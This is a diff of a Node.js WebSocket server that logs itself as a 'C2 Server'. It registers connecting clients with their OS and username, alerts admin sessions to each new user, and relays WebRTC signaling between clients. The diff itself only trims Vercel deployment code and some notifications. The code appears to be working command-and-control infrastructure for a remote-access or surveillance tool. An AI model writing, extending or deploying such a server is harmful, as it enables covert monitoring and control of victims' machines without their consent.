@@ -3,19 +3,18 @@ const http = require('http');
 const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
-const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Store active sessions: ID -> { ws, info, isAdmin, lastSeen }
+// Store active sessions: ID -> { ws, info, isAdmin }
 let clients = {};
 
 // Serve admin.html from the current directory
 app.use(express.static(path.join(__dirname))); 
 
-wss.on('connection', (ws, req) => {
+wss.on('connection', (ws) => {
     const id = uuidv4().substr(0, 8);
     clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
@@ -32,7 +31,6 @@ wss.on('connection', (ws, req) => {
             if (data.type === 'register_admin') {
                 clients[id].isAdmin = true;
                 console.log(`[ADMIN] Connected with ID: ${id}`);
-                notifyAdmin(id, `🟢 Admin Logged In`);
                 return;
             }
 
@@ -45,6 +43,7 @@ wss.on('connection', (ws, req) => {
                 notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                 
                 // ALSO broadcast the info directly to admins so they appear in the grid immediately
+                // This ensures the frontend 'users' object gets updated via the 'info' type handler
                 broadcastToAdmin(id, data); 
             } 
             // Forward signaling data (Offer/Answer/Candidate) between users
@@ -94,23 +93,7 @@ function forwardToTarget(sourceId, data) {
     }
 }
 
-// Export the handler for Vercel
-module.exports = async (req, res) => {
-    // Handle static files explicitly if needed, though express.static handles most
-    if (req.url === '/health') {
-        res.writeHead(200, { 'Content-Type': 'text/plain' });
-        res.end('OK');
-        return;
-    }
-
-    // If it's not a static file or API route, let Express handle it
-    app(req, res);
-};
-
-// Local Development Listener
-if (!process.env.VERCEL) {
-    const PORT = process.env.PORT || 3000;
-    server.listen(PORT, () => {
-        console.log(`C2 Server running on port ${PORT}`);
-    });
-}
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`C2 Server running on port ${PORT}`);
+});
